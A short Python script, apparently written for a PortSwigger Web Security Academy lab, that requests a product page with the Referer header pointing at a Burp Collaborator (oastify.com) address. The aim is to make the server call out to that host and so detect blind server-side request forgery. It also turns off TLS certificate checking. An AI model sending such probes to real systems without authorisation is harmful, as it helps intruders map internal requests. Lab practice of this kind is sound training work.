import http.client
import ssl
import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "http://???.oastify.com"


def GET_product() -> http.client.HTTPResponse:
    method, path = 'GET', '/product?productId=2'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'referer': COLLABORATOR_URL,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


# sanity check on burp collaborator
response = GET_product(
    
)

print(f"status: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())
